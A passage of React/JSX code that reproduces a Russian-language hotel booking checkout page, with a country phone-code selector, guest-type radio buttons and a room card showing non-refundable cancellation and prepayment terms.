                                                        <option value="GY" data-calling-code="592">Гайана +592</option>
                                                        <option value="GM" data-calling-code="220">Гамбия +220</option>
                                                        <option value="GH" data-calling-code="233">Гана +233</option>
                                                        <option value="GP" data-calling-code="590">Гваделупа +590
                                                        </option>
                                                        <option value="GT" data-calling-code="502">Гватемала +502
                                                        </option>
                                                        <option value="GN" data-calling-code="224">Гвинея +224</option>
                                                        <option value="GW" data-calling-code="245">Гвинея-Бисау +245
                                                        </option>
                                                        <option value="DE" data-calling-code="49">Германия +49</option>
                                                        <option value="GI" data-calling-code="350">Гибралтар +350
                                                        </option>
                                                        <option value="HN" data-calling-code="504">Гондурас +504
                                                        </option>
                                                        <option value="HK" data-calling-code="852">Гонконг +852</option>
                                                        <option value="GD" data-calling-code="1473">Гренада +1473
                                                        </option>
                                                        <option value="GL" data-calling-code="299">Гренландия +299
                                                        </option>
                                                        <option value="GR" data-calling-code="30">Греция +30</option>
                                                        <option value="GE" data-calling-code="995">Грузия +995</option>
                                                        <option value="GU" data-calling-code="1671">Гуам +1671</option>
                                                        <option value="DK" data-calling-code="45">Дания +45</option>
                                                        <option value="CD" data-calling-code="243">Демократическая
                                                            Республика Конго +243
                                                        </option>
                                                        <option value="DJ" data-calling-code="253">Джибути +253</option>
                                                        <option value="DM" data-calling-code="1767">Доминика +1767
                                                        </option>
                                                        <option value="DO" data-calling-code="1849">Доминиканская
                                                            Республика +1849
                                                        </option>
                                                        <option value="EG" data-calling-code="20">Египет +20</option>
                                                        <option value="ZM" data-calling-code="260">Замбия +260</option>
                                                        <option value="ZW" data-calling-code="263">Зимбабве +263
                                                        </option>
                                                        <option value="IL" data-calling-code="972">Израиль +972</option>
                                                        <option value="IN" data-calling-code="91">Индия +91</option>
                                                        <option value="ID" data-calling-code="62">Индонезия +62</option>
                                                        <option value="JO" data-calling-code="962">Иордания +962
                                                        </option>
                                                        <option value="IQ" data-calling-code="964">Ирак +964</option>
                                                        <option value="IR" data-calling-code="98">Иран +98</option>
                                                        <option value="IE" data-calling-code="353">Ирландия +353
                                                        </option>
                                                        <option value="IS" data-calling-code="354">Исландия +354
                                                        </option>
                                                        <option value="ES" data-calling-code="34">Испания +34</option>
                                                        <option value="IT" data-calling-code="39">Италия +39</option>
                                                        <option value="YE" data-calling-code="967">Йемен +967</option>
                                                        <option value="CV" data-calling-code="238">Кабо-Верде +238
                                                        </option>
                                                        <option value="KZ" data-calling-code="7">Казахстан +7</option>
                                                        <option value="KY" data-calling-code="1345">Каймановы острова
                                                            +1345
                                                        </option>
                                                        <option value="KH" data-calling-code="855">Камбоджа +855
                                                        </option>
                                                        <option value="CM" data-calling-code="237">Камерун +237</option>
                                                        <option value="CA" data-calling-code="1">Канада +1</option>
                                                        <option value="QA" data-calling-code="974">Катар +974</option>
                                                        <option value="KE" data-calling-code="254">Кения +254</option>
                                                        <option value="CY" data-calling-code="357">Кипр +357</option>
                                                        <option value="KG" data-calling-code="996">Киргизия +996
                                                        </option>
                                                        <option value="KI" data-calling-code="686">Кирибати +686
                                                        </option>
                                                        <option value="CN" data-calling-code="86">Китай +86</option>
                                                        <option value="CC" data-calling-code="61">Кокосовые острова
                                                            (острова Килинг) +61
                                                        </option>
                                                        <option value="CO" data-calling-code="57">Колумбия +57</option>
                                                        <option value="KM" data-calling-code="269">Коморские острова
                                                            +269
                                                        </option>
                                                        <option value="CG" data-calling-code="242">Конго +242</option>
                                                        <option value="XK" data-calling-code="383">Косово +383</option>
                                                        <option value="CR" data-calling-code="506">Коста-Рика +506
                                                        </option>
                                                        <option value="CI" data-calling-code="225">Кот-д'Ивуар +225
                                                        </option>
                                                        <option value="CU" data-calling-code="53">Куба +53</option>
                                                        <option value="KW" data-calling-code="965">Кувейт +965</option>
                                                        <option value="CW" data-calling-code="599">Кюрасао +599</option>
                                                        <option value="LA" data-calling-code="856">Лаос +856</option>
                                                        <option value="LV" data-calling-code="371">Латвия +371</option>
                                                        <option value="LS" data-calling-code="266">Лесото +266</option>
                                                        <option value="LR" data-calling-code="231">Либерия +231</option>
                                                        <option value="LB" data-calling-code="961">Ливан +961</option>
                                                        <option value="LY" data-calling-code="218">Ливия +218</option>
                                                        <option value="LT" data-calling-code="370">Литва +370</option>
                                                        <option value="LI" data-calling-code="423">Лихтенштейн +423
                                                        </option>
                                                        <option value="LU" data-calling-code="352">Люксембург +352
                                                        </option>
                                                        <option value="MU" data-calling-code="230">Маврикий +230
                                                        </option>
                                                        <option value="MR" data-calling-code="222">Мавритания +222
                                                        </option>
                                                        <option value="MG" data-calling-code="261">Мадагаскар +261
                                                        </option>
                                                        <option value="YT" data-calling-code="269">Майотта +269</option>
                                                        <option value="MO" data-calling-code="853">Макао +853</option>
                                                        <option value="MW" data-calling-code="265">Малави +265</option>
                                                        <option value="MY" data-calling-code="60">Малайзия +60</option>
                                                        <option value="ML" data-calling-code="223">Мали +223</option>
                                                        <option value="MV" data-calling-code="960">Мальдивы +960
                                                        </option>
                                                        <option value="MT" data-calling-code="356">Мальта +356</option>
                                                        <option value="MA" data-calling-code="212">Марокко +212</option>
                                                        <option value="MQ" data-calling-code="596">Мартиника +596
                                                        </option>
                                                        <option value="MH" data-calling-code="692">Маршалловы острова
                                                            +692
                                                        </option>
                                                        <option value="MX" data-calling-code="52">Мексика +52</option>
                                                        <option value="FM" data-calling-code="691">Микронезия +691
                                                        </option>
                                                        <option value="MZ" data-calling-code="258">Мозамбик +258
                                                        </option>
                                                        <option value="MD" data-calling-code="373">Молдова +373</option>
                                                        <option value="MC" data-calling-code="377">Монако +377</option>
                                                        <option value="MN" data-calling-code="976">Монголия +976
                                                        </option>
                                                        <option value="MS" data-calling-code="1664">Монтсеррат +1664
                                                        </option>
                                                        <option value="MM" data-calling-code="95">Мьянма +95</option>
                                                        <option value="NA" data-calling-code="264">Намибия +264</option>
                                                        <option value="NR" data-calling-code="674">Науру +674</option>
                                                        <option value="NP" data-calling-code="977">Непал +977</option>
                                                        <option value="NE" data-calling-code="227">Нигер +227</option>
                                                        <option value="NG" data-calling-code="234">Нигерия +234</option>
                                                        <option value="NL" data-calling-code="31">Нидерланды +31
                                                        </option>
                                                        <option value="NI" data-calling-code="505">Никарагуа +505
                                                        </option>
                                                        <option value="NU" data-calling-code="683">Ниуэ +683</option>
                                                        <option value="NZ" data-calling-code="64">Новая Зеландия +64
                                                        </option>
                                                        <option value="NC" data-calling-code="687">Новая Каледония
                                                            +687
                                                        </option>
                                                        <option value="NO" data-calling-code="47">Норвегия +47</option>
                                                        <option value="AE" data-calling-code="971">ОАЭ +971</option>
                                                        <option value="TZ" data-calling-code="255">Объединенная
                                                            Республика Танзания +255
                                                        </option>
                                                        <option value="OM" data-calling-code="968">Оман +968</option>
                                                        <option value="CK" data-calling-code="682">Острова Кука +682
                                                        </option>
                                                        <option value="PK" data-calling-code="92">Пакистан +92</option>
                                                        <option value="PW" data-calling-code="680">Палау +680</option>
                                                        <option value="PS" data-calling-code="970">Палестинская
                                                            Территория +970
                                                        </option>
                                                        <option value="PA" data-calling-code="507">Панама +507</option>
                                                        <option value="PG" data-calling-code="675">Папуа-Новая Гвинея
                                                            +675
                                                        </option>
                                                        <option value="PY" data-calling-code="595">Парагвай +595
                                                        </option>
                                                        <option value="PE" data-calling-code="51">Перу +51</option>
                                                        <option value="PL" data-calling-code="48">Польша +48</option>
                                                        <option value="PT" data-calling-code="351">Португалия +351
                                                        </option>
                                                        <option value="PR" data-calling-code="1939">Пуэрто-Рико +1939
                                                        </option>
                                                        <option value="RE" data-calling-code="262">Реюньон +262</option>
                                                        <option value="RU" data-calling-code="7">Россия +7</option>
                                                        <option value="RW" data-calling-code="250">Руанда +250</option>
                                                        <option value="RO" data-calling-code="40">Румыния +40</option>
                                                        <option value="US" data-calling-code="1">США +1</option>
                                                        <option value="SV" data-calling-code="503">Сальвадор +503
                                                        </option>
                                                        <option value="WS" data-calling-code="685">Самоа +685</option>
                                                        <option value="SM" data-calling-code="378">Сан-Марино +378
                                                        </option>
                                                        <option value="ST" data-calling-code="239">Сан-Томе и Принсипи
                                                            +239
                                                        </option>
                                                        <option value="SA" data-calling-code="966">Саудовская Аравия
                                                            +966
                                                        </option>
                                                        <option value="KP" data-calling-code="850">Северная Корея +850
                                                        </option>
                                                        <option value="MK" data-calling-code="389">Северная Македония
                                                            +389
                                                        </option>
                                                        <option value="MP" data-calling-code="1670">Северные Марианские
                                                            острова +1670
                                                        </option>
                                                        <option value="SC" data-calling-code="248">Сейшельские острова
                                                            +248
                                                        </option>
                                                        <option value="BL" data-calling-code="590">Сен-Бартелеми +590
                                                        </option>
                                                        <option value="MF" data-calling-code="590">Сен-Мартен +590
                                                        </option>
                                                        <option value="PM" data-calling-code="508">Сен-Пьер и Микелон
                                                            +508
                                                        </option>
                                                        <option value="SN" data-calling-code="221">Сенегал +221</option>
                                                        <option value="VC" data-calling-code="1784">Сент-Винсент и
                                                            Гренадины +1784
                                                        </option>
                                                        <option value="KN" data-calling-code="1869">Сент-Киттс и Невис
                                                            +1869
                                                        </option>
                                                        <option value="LC" data-calling-code="1758">Сент-Люсия +1758
                                                        </option>
                                                        <option value="RS" data-calling-code="381">Сербия +381</option>
                                                        <option value="SG" data-calling-code="65">Сингапур +65</option>
                                                        <option value="SX" data-calling-code="1721">Синт-Мартен +1721
                                                        </option>
                                                        <option value="SY" data-calling-code="963">Сирийская Арабская
                                                            Республика +963
                                                        </option>
                                                        <option value="SK" data-calling-code="421">Словакия +421
                                                        </option>
                                                        <option value="SI" data-calling-code="386">Словения +386
                                                        </option>
                                                        <option value="SB" data-calling-code="677">Соломоновы острова
                                                            +677
                                                        </option>
                                                        <option value="SO" data-calling-code="252">Сомали +252</option>
                                                        <option value="SD" data-calling-code="249">Судан +249</option>
                                                        <option value="SR" data-calling-code="597">Суринам +597</option>
                                                        <option value="SL" data-calling-code="232">Сьерра-Леоне +232
                                                        </option>
                                                        <option value="TJ" data-calling-code="992">Таджикистан +992
                                                        </option>
                                                        <option value="TH" data-calling-code="66">Таиланд +66</option>
                                                        <option value="TW" data-calling-code="886">Тайвань +886</option>
                                                        <option value="TG" data-calling-code="228">Того +228</option>
                                                        <option value="TK" data-calling-code="690">Токелау +690</option>
                                                        <option value="TO" data-calling-code="676">Тонга +676</option>
                                                        <option value="TT" data-calling-code="1868">Тринидад и Тобаго
                                                            +1868
                                                        </option>
                                                        <option value="TV" data-calling-code="688">Тувалу +688</option>
                                                        <option value="TN" data-calling-code="216">Тунис +216</option>
                                                        <option value="TM" data-calling-code="993">Туркмения +993
                                                        </option>
                                                        <option value="TR" data-calling-code="90">Турция +90</option>
                                                        <option value="UG" data-calling-code="256">Уганда +256</option>
                                                        <option value="UZ" data-calling-code="998">Узбекистан +998
                                                        </option>
                                                        <option value="UA" data-calling-code="380">Украина +380</option>
                                                        <option value="UY" data-calling-code="598">Уругвай +598</option>
                                                        <option value="FO" data-calling-code="298">Фарерские острова
                                                            +298
                                                        </option>
                                                        <option value="FJ" data-calling-code="679">Фиджи +679</option>
                                                        <option value="PH" data-calling-code="63">Филиппины +63</option>
                                                        <option value="FI" data-calling-code="358">Финляндия +358
                                                        </option>
                                                        <option value="FK" data-calling-code="500">Фолклендские острова
                                                            +500
                                                        </option>
                                                        <option value="FR" data-calling-code="33">Франция +33</option>
                                                        <option value="GF" data-calling-code="594">Французская Гвиана
                                                            +594
                                                        </option>
                                                        <option value="PF" data-calling-code="689">Французская Полинезия
                                                            +689
                                                        </option>
                                                        <option value="TF" data-calling-code="596">Французские Южные
                                                            Территории +596
                                                        </option>
                                                        <option value="HR" data-calling-code="385">Хорватия +385
                                                        </option>
                                                        <option value="CF" data-calling-code="236">Центральноафриканская
                                                            Республика +236
                                                        </option>
                                                        <option value="TD" data-calling-code="235">Чад +235</option>
                                                        <option value="ME" data-calling-code="382">Черногория +382
                                                        </option>
                                                        <option value="CZ" data-calling-code="420">Чехия +420</option>
                                                        <option value="CL" data-calling-code="56">Чили +56</option>
                                                        <option value="CH" data-calling-code="41">Швейцария +41</option>
                                                        <option value="SE" data-calling-code="46">Швеция +46</option>
                                                        <option value="LK" data-calling-code="94">Шри-Ланка +94</option>
                                                        <option value="EC" data-calling-code="593">Эквадор +593</option>
                                                        <option value="GQ" data-calling-code="240">Экваториальная Гвинея
                                                            +240
                                                        </option>
                                                        <option value="ER" data-calling-code="291">Эритрея +291</option>
                                                        <option value="SZ" data-calling-code="268">Эсватини +268
                                                        </option>
                                                        <option value="EE" data-calling-code="372">Эстония +372</option>
                                                        <option value="ET" data-calling-code="251">Эфиопия +251</option>
                                                        <option value="GS" data-calling-code="500">Южная Георгия и Южные
                                                            Сандвичевы о… +500
                                                        </option>
                                                        <option value="KR" data-calling-code="82">Южная Корея +82
                                                        </option>
                                                        <option value="ZA" data-calling-code="27">Южно-Африканская
                                                            Республика +27
                                                        </option>
                                                        <option value="SS" data-calling-code="211">Южный Судан +211
                                                        </option>
                                                        <option value="JM" data-calling-code="1876">Ямайка +1876
                                                        </option>
                                                        <option value="JP" data-calling-code="81">Япония +81</option>
                                                        <option value="TC" data-calling-code="1649">о-ва Теркс и Кайкос
                                                            +1649
                                                        </option>
                                                        <option value="HM" data-calling-code="692">о-ва Херд и
                                                            Макдональд +692
                                                        </option>
                                                        <option value="BV" data-calling-code="47">остров Буве +47
                                                        </option>
                                                        <option value="GG" data-calling-code="44">остров Гернси +44
                                                        </option>
                                                        <option value="JE" data-calling-code="44">остров Джерси +44
                                                        </option>
                                                        <option value="IM" data-calling-code="44">остров Мэн +44
                                                        </option>
                                                        <option value="NF" data-calling-code="672">остров Норфолк +672
                                                        </option>
                                                        <option value="CX" data-calling-code="61">остров Рождества +61
                                                        </option>
                                                        <option value="SH" data-calling-code="290">остров Святой Елены
                                                            +290
                                                        </option>
                                                        <option value="PN" data-calling-code="872">острова Питкэрн
                                                            +872
                                                        </option>
                                                        <option value="WF" data-calling-code="681">острова Уоллис и
                                                            Футуна +681
                                                        </option>
                                                        <option value="SJ" data-calling-code="378">острова Шпицберген и
                                                            Ян-Майен +378
                                                        </option>
                                                    </select>
                                                    <span className="c-input-phone-country__flag"><span
                                                        className="c-input-phone-country__flag__img" data-phone-flag=""
                                                        style={{backgroundPosition: '0px -5725px'}}></span></span>
                                                    <input id="phone" className="
bp_form__field__input
bp_input_text
c-input-phone-country__input
" type="text" name="phone" required="" value={entity.phoneNumber} onChange={(e) => setEntity((prevState) => ({
                                                        ...prevState,
                                                        phoneNumber: e.target.value
                                                    }))} size="20" data-phone-input="" data-component="input-limited"
                                                           data-input-allowed-type="number backquoteNumeric space"
                                                           aria-describedby="bp_form_phone_msg" placeholder="+380"/>
                                                </div>
                                            </div>
                                            <div
                                                className="bui-text--variant-body_2 bui-text--color-neutral_alt bui-u-padding-top--4"
                                                bis_skin_checked="1">
                                                Необходим объекту размещения, чтобы удостовериться в действительности
                                                вашего бронирования
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div className="bui-grid__column bui-group" bis_skin_checked="1">
                                <fieldset className="bui-form__group bp-control-group     " aria-role="group">
                                    <div className="bui-group  " bis_skin_checked="1">
                                        <div className="bui-group__item" bis_skin_checked="1">
                                            <div
                                                className="bui-form__group bp-form-group bp-form-group__send_link_app   "
                                                bis_skin_checked="1">
                                                <label className="bui-checkbox  ">
                                                    <input name="send_link_app" id="send_link_app" type="checkbox"
                                                           className="bui-checkbox__input" value="1" checked=""/>
                                                    <span className="bui-checkbox__label">   Да, отправьте мне бесплатное электронное подтверждение (рекомендуется)     </span>
                                                </label>
                                                <div
                                                    className="bui-u-margin-top--4 bui-f-color-grayscale bui-f-font-caption bp-control-checkbox__subtitle"
                                                    bis_skin_checked="1">
                                                    Мы отправим вам ссылку для загрузки нашего приложения
                                                </div>
                                                <div id="form-field__helper--send_link_app"
                                                     className="bui-form__error js-form-field__helper--send_link_app"
                                                     bis_skin_checked="1"></div>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="form-field__helper--" className="bui-form__error js-form-field__helper--"
                                         bis_skin_checked="1"></div>
                                </fieldset>
                            </div>
                            <div className="bui-grid__column" bis_skin_checked="1">
                                <hr className="bui-divider"/>
                            </div>
                            <div className="bui-grid__column" bis_skin_checked="1">
                                <fieldset id="bp-control-group--notstayer"
                                          className="bui-form__group bp-control-group bp-control-group--notstayer js-control-group--notstayer    e2e-guest-type-selection "
                                          aria-role="radiogroup" aria-labelledby="bp-control-group__label--notstayer"
                                          data-clear-guestname="1">
                                    <legend className="bp-control-group__label"
                                            id="bp-control-group__label--notstayer">Кто основной гость?
                                    </legend>
                                    <div className="bui-group  " bis_skin_checked="1">
                                        <div className="bui-group__item" bis_skin_checked="1">
                                            <div
                                                className="bui-form__group bp-form-group bp-form-group__notstayer_false   "
                                                bis_skin_checked="1">
                                                <label className="bui-radio  ">
                                                    <input name="notstayer" id="notstayer_false" type="radio"
                                                           className="bui-radio__input" value="0"/>
                                                    <span className="bui-radio__label">   Я     </span>
                                                </label>
                                                <div id="form-field__helper--notstayer_false"
                                                     className="bui-form__error js-form-field__helper--notstayer_false"
                                                     bis_skin_checked="1"></div>
                                            </div>
                                        </div>
                                        <div className="bui-group__item" bis_skin_checked="1">
                                            <div
                                                className="bui-form__group bp-form-group bp-form-group__notstayer_true   "
                                                bis_skin_checked="1">
                                                <label className="bui-radio  ">
                                                    <input name="notstayer" id="notstayer_true" type="radio"
                                                           className="bui-radio__input" value="1"/>
                                                    <span className="bui-radio__label">   Другой человек     </span>
                                                </label>
                                                <div id="form-field__helper--notstayer_true"
                                                     className="bui-form__error js-form-field__helper--notstayer_true"
                                                     bis_skin_checked="1"></div>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="form-field__helper--notstayer"
                                         className="bui-form__error js-form-field__helper--notstayer"
                                         bis_skin_checked="1"></div>
                                </fieldset>
                            </div>


                        </div>
                    </div>
                </div>
            </div>
        </section>
    }
    function SecondHotelInfo(){
        return <div className="js-card--unit-details-container e2e-card--unit-details-container" bis_skin_checked="1">
            <section className="bui-card bp-card--unit-details bui-spacer--large  bui-u-bleed@small js-unit__container"
                     data-room-id="257021803_229117878_0_2_0" data-room-sequencial-id="1">
                <div className="bui-card__content" bis_skin_checked="1">
                    <div className="bui-group bui-group--large bui-spacer--large" bis_skin_checked="1">
                        <div className="bui-group__item" bis_skin_checked="1">
                            <h2 className="bui-text--variant-headline_3 unit-details__name js-unit-details__name">
                                Двухместный номер с 1 кроватью или 2 отдельными кроватями и балконом
                            </h2>
                        </div>
                        <div className="bui-group__item" bis_skin_checked="1">
                            <div className="bui-group bui-group--medium bp-unit-details__policy-container"
                                 bis_skin_checked="1">
                                <div className="bui-group__item" bis_skin_checked="1">
                                    <div className="e2e-unit-details__policies" bis_skin_checked="1">
                                        <div className="e2e-room-policy" bis_skin_checked="1">
                                            <div className="bui-group bui-group--inline bui-group--wrap-nowrap tpex-policy"
                                                 data-testid="cancellation-policy" style={{display: 'inline-flex'}}
                                                 bis_skin_checked="1">
                                                <div className="bui-group__item"
                                                     style={{lineHeight: 'var(--bui_font_body_2_line-height)'}}
                                                     bis_skin_checked="1"><span
                                                    className="bui-icon bui-icon--small bui-text--color-neutral"
                                                    style={{height: 'var(--bui_spacing_4x)', lineHeight: 'var(--bui_spacing_4x)', position: 'relative', textAlign: 'center', userSelect: 'none', verticalAlign: 'middle', width: 'var(--bui_spacing_4x)', top: '-1px', fontWeight: '400'}}
                                                    role="presentation" aria-hidden="true">•</span></div>
                                                <div className="bui-group__item bui-group__item--grow" bis_skin_checked="1">
                                                    <div className="bui-group bui-group--small" bis_skin_checked="1">
                                                        <div className="bui-group__item" data-testid="policy-subtitle"
                                                             bis_skin_checked="1"><span
                                                            className="bui-text--variant-body_2 bui-text--color-neutral">  <strong
                                                            className="bui-text--variant-strong_2"
                                                            style={{fontSize: 'inherit',fontWeight: 'var(--bui_font_strong_2_font-weight) !important'}}> Стоимость не возвращается </strong>  </span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div className="bui-group__item" data-testid="policy-tooltip"
                                                     bis_skin_checked="1"><span style={{position: 'relative', top: '-2px'}}>
<button className="bui-link" aria-controls="modal-policy-details__257021803_229117878_0_2_0_229117878"
        aria-label="Подробнее о правилах отмены и предоплаты" data-bui-component="Modal"
        data-modal-close-aria-label="Закрыть" data-modal-id="modal-policy-details__257021803_229117878_0_2_0_229117878"
        data-et-click="goal:bp_room_conditions_tooltip_viewed" data-testid="policy-modal-trigger" type="button">
<span className="bui-icon bui-icon--small" style={{verticalAlign: 'middle'}}>
<svg className="bk-icon -streamline-question_mark_circle" fill="#0071C2" height="16" width="16" viewBox="0 0 24 24"
     role="presentation" aria-hidden="true" focusable="false"><path
    d="M9.75 9a2.25 2.25 0 1 1 3 2.122 2.25 2.25 0 0 0-1.5 2.122v1.006a.75.75 0 0 0 1.5 0v-1.006c0-.318.2-.602.5-.708A3.75 3.75 0 1 0 8.25 9a.75.75 0 1 0 1.5 0zM12 16.5a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5zM22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12zm1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12z"></path></svg>
</span>
</button>
</span></div>
                                            </div>
                                        </div>
                                        <template id="modal-policy-details__257021803_229117878_0_2_0_229117878"
                                                  style={{display: 'none !important'}}>
                                            <div className="bui-modal__body">
                                                <div className="bui-spacer--large"></div>
                                                <div className="bui-group bui-group--large">
                                                    <div className="bui-group__item">
                                                        <div
                                                            className="bui-text bui-text--variant-strong_1 bui-spacer--medium">
                                                            Отмена бронирования
                                                        </div>
                                                        <div className="bui-group">
                                                            <div className="bui-group__item">
                                                                <div
                                                                    className="bui-group bui-group--inline bui-group--wrap-nowrap tpex-policy"
                                                                    data-testid="cancellation-policy"
                                                                    style={{display: 'inline-flex'}}>
                                                                    <div className="bui-group__item"
                                                                         style={{lineHeight: 'var(--bui_font_body_2_line-height)'}}>
                                                                    <span
                                                                        className="bui-icon bui-icon--small bui-text--color-neutral"
                                                                        style={{height: 'var(--bui_spacing_4x)' ,lineHeight: 'var(--bui_spacing_4x)', position: 'relative', textAlign: 'center', userSelect: 'none', verticalAlign: 'middle', width: 'var(--bui_spacing_4x)' ,top: '-1px', fontWeight: '700'}}
                                                                        role="presentation" aria-hidden="true">•</span>
                                                                    </div>
                                                                    <div className="bui-group__item bui-group__item--grow">
                                                                        <div className="bui-group bui-group--small">
                                                                            <div className="bui-group__item"
                                                                                 data-testid="policy-subtitle"><span
                                                                                className="bui-text--variant-body_2 bui-text--color-neutral">  <strong
                                                                                className="bui-text--variant-strong_2"
                                                                                style={{fontSize: 'inherit', fontWeight: 'var(--bui_font_strong_2_font-weight) !important'}}> Стоимость не возвращается </strong>  </span>
                                                                            </div>
                                                                            <div className="bui-group__item"
                                                                                 data-testid="policy-description">
                                                                                <div
                                                                                    className="bui-text--variant-body_2 bui-text--color-neutral">Обратите
                                                                                    внимание: при отмене или изменении
                                                                                    бронирования, а также в случае незаезда
                                                                                    взимается полная стоимость бронирования.
                                                                                </div>
                                                                            </div>
                                                                            <div className="bui-group__item">
                                                                                <div className="bui-spacer--medium"></div>
                                                                                <div className="bui-group bui-group--small">
                                                                                    <div className="bui-group__item">
                                                                                        <div
                                                                                            className="bui-text bui-text--variant-body_2"
                                                                                            data-testid="tooltip-policy-free-date-change">
                                                                                            Однако у вас есть возможность
                                                                                            один раз поменять даты бесплатно
                                                                                            до 30 апреля 2024 года
                                                                                            (включительно), если цена
                                                                                            обновленного бронирования
                                                                                            останется прежней или станет
                                                                                            выше. С вас спишут средства
                                                                                            только в том случае, если между
                                                                                            бронированиями будет разница в
                                                                                            цене.
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div className="bui-group__item">
                                                        <div
                                                            className="bui-text bui-text--variant-strong_1 bui-spacer--medium">
                                                            Предоплата
                                                        </div>
                                                        <div
                                                            className="bui-group bui-group--inline bui-group--wrap-nowrap tpex-policy"
                                                            data-testid="prepayment-policy" style={{display: 'inline-flex'}}>
                                                            <div className="bui-group__item bui-group__item--grow">
                                                                <div className="bui-group bui-group--small">
                                                                    <div className="bui-group__item"
                                                                         data-testid="policy-description">
                                                                        <div
                                                                            className="bui-text--variant-body_2 bui-text--color-neutral">Предоплата
                                                                            в размере полной стоимости бронирования будет
                                                                            списана с вас в любое время.
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </template>
                                    </div>
                                </div>
                                <div className="bui-group__item" bis_skin_checked="1">
                                    <div className="bui-group bui-group--inline bui-group--wrap-nowrap"
                                         bis_skin_checked="1">
                                        <div className="bui-group__item" bis_skin_checked="1">
<span className="bui-icon bui-icon--small">
<svg className="bk-icon -streamline-checkmark_fill" fill="#008009" height="16" role="presentation" width="16"
     viewBox="0 0 128 128" aria-hidden="true" focusable="false"><path
    d="M56.33 102a6 6 0 0 1-4.24-1.75L19.27 67.54A6.014 6.014 0 1 1 27.74 59l27.94 27.88 44-58.49a6 6 0 1 1 9.58 7.22l-48.17 64a5.998 5.998 0 0 1-4.34 2.39z"></path></svg>
</span>
                                        </div>
                                        <div className="bui-group__item" bis_skin_checked="1">
<span className="bui-text--color-constructive">
<strong>Можно изменить даты бронирования</strong>, если планы поменялись
</span>
                                        </div>
                                    </div>
                                </div>
                                <div className="bui-group__item" bis_skin_checked="1">
                                    <div className="bui-group__item" bis_skin_checked="1">
                                        <div className="bui-group bui-group--inline bui-group--wrap-nowrap"
                                             bis_skin_checked="1">
                                            <div className="bui-group__item" bis_skin_checked="1">
<span className="bui-icon bui-icon--small">
<svg className="bk-icon -streamline-couple" fill="#262626" height="16" role="presentation" width="16"
     viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path
    d="M8.25 3.75a2.25 2.25 0 1 1-4.5 0 2.25 2.25 0 0 1 4.5 0zm1.5 0a3.75 3.75 0 1 0-7.5 0 3.75 3.75 0 0 0 7.5 0zM12 13.5a6 6 0 0 0-12 0v2.25c0 .414.336.75.75.75H3l-.746-.675.75 7.5A.75.75 0 0 0 3.75 24h4.5a.75.75 0 0 0 .746-.675l.75-7.5L9 16.5h2.25a.75.75 0 0 0 .75-.75V13.5zm-1.5 0v2.25l.75-.75H9a.75.75 0 0 0-.746.675l-.75 7.5.746-.675h-4.5l.746.675-.75-7.5A.75.75 0 0 0 3 15H.75l.75.75V13.5a4.5 4.5 0 1 1 9 0zm9.75-9.75a2.25 2.25 0 1 1-4.5 0 2.25 2.25 0 0 1 4.5 0zm1.5 0a3.75 3.75 0 1 0-7.5 0 3.75 3.75 0 0 0 7.5 0zM13.5 16.5H15l-.746-.675.75 7.5a.75.75 0 0 0 .746.675h4.5a.75.75 0 0 0 .746-.675l.75-7.5L21 16.5h2.25a.75.75 0 0 0 .75-.75V13.5a6 6 0 0 0-11.143-3.086.75.75 0 0 0 1.286.772 4.5 4.5 0 0 1 8.357 2.315v2.249l.75-.75H21a.75.75 0 0 0-.746.675l-.75 7.5.746-.675h-4.5l.746.675-.75-7.5A.75.75 0 0 0 15 15h-1.5a.75.75 0 0 0 0 1.5z"></path></svg>
</span>
                                            </div>
                                            <div className="bui-group__item" bis_skin_checked="1">
                                                <strong>Гости: </strong>
                                                2 взрослых
                                                <input type="hidden" name="nr_guests_257021803_229117878_0_2_0" value="2"/>
                                            </div>
                                            <div className="bui-group__item" bis_skin_checked="1">
                                                <button className="bui-link" type="button" data-bui-component="Tooltip"
                                                        data-tooltip-position="bottom"
                                                        data-tooltip-text="Если вам нужно изменить информацию о гостях, вернитесь назад.">
                                                    <svg className="bk-icon -streamline-question_mark_circle" fill="#0071C2"
                                                         height="16" width="16" viewBox="0 0 24 24" role="presentation"
                                                         aria-hidden="true" focusable="false">
                                                        <path
                                                            d="M9.75 9a2.25 2.25 0 1 1 3 2.122 2.25 2.25 0 0 0-1.5 2.122v1.006a.75.75 0 0 0 1.5 0v-1.006c0-.318.2-.602.5-.708A3.75 3.75 0 1 0 8.25 9a.75.75 0 1 0 1.5 0zM12 16.5a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5zM22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12zm1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12z"></path>
                                                    </svg>
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="bui-group__item" bis_skin_checked="1">
                            <div className="bui-group bui-group--small" bis_skin_checked="1">
                                <div className="bui-group__item" bis_skin_checked="1">
                                    <div className="bui-group bui-group--inline bui-group--wrap-nowrap"
                                         bis_skin_checked="1">
                                        <div className="bui-group__item" bis_skin_checked="1">
<span className="bui-icon bui-icon--small">
<svg className="bk-icon -streamline-sparkles" fill="#333333" height="16" role="presentation" width="16"
     viewBox="0 0 128 128" aria-hidden="true" focusable="false"><path
